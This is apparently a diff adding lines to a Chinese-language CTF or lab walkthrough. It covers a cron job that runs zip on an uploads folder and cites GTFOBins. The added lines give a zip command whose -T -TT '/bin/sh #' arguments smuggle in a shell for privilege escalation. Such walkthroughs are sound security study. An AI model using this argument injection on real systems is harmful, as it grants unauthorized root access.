@@ -93,3 +93,7 @@ inotifywait -m -e create /home/watcher/uploads
 去GTFObins找一下
 存在命令执行和文件读取。[https://gtfobins.org/gtfobins/zip/#file-read]
 
+这里是定时任务执行zip命令，那我们应该是要构造参数提权
+```bash
+zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #'
+```
